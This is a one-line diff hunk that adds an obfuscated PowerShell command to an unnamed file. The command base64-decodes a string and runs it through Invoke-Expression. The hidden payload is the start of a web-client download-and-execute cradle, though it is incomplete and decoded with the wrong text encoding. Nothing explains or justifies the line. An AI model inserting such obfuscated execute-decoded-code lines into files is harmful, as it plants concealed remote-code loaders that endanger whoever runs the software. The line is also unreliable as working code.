@@ -1,0 +1,1 @@
+powershell -c "iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAA==')))"
